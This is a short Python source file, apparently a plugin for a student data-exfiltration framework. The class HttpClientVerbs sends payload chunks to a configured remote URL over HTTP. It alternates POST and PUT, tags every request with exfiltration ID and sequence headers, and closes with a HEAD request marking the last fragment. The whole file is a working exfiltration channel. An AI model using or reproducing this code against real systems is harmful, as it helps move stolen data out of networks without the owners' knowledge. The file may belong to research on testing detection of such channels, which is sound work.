from __future__ import annotations
from typing import Dict, Any, Iterable
import urllib.request, urllib.error
import time

from tfg.plugins.api import ExfilClientPlugin

class HttpClientVerbs(ExfilClientPlugin):
    canal = "HTTP"
    metodo = 2
    name = "http_client_verbs"

    def run(self, config: Dict[str, Any], payload_iter: Iterable[bytes]) -> Dict[str, Any]:
        url = config.get("url")
        if not url:
            raise ValueError("Falta 'url' en config para HttpClientVerbs")
        exfil_id = config.get("exfil_id") or str(int(time.time()*1000))
        timeout = int(config.get("timeout_s") or 10)
        user_agent = config.get("user_agent") or "TFG-Exfil/1.0"

        sent_bytes = 0
        sent_frags = 0
        seq = 0
        for chunk in payload_iter:
            method = "POST" if (seq % 2 == 0) else "PUT"
            headers = {"User-Agent": user_agent, "X-Exfil-Id": exfil_id, "X-Exfil-Seq": str(seq), "Content-Type": "application/octet-stream"}
            req = urllib.request.Request(url=url, data=chunk, headers=headers, method=method)
            with urllib.request.urlopen(req, timeout=timeout) as resp:
                _ = resp.read()
            sent_bytes += len(chunk)
            sent_frags += 1
            seq += 1

        headers = {"User-Agent": user_agent, "X-Exfil-Id": exfil_id, "X-Exfil-Seq": str(seq), "X-Exfil-Last": "1"}
        req = urllib.request.Request(url=url, data=None, headers=headers, method="HEAD")
        with urllib.request.urlopen(req, timeout=timeout) as resp:
            _ = resp.read()

        return {"ok": True, "plugin": self.name, "exfil_id": exfil_id, "sent_bytes": sent_bytes, "sent_fragments": sent_frags}
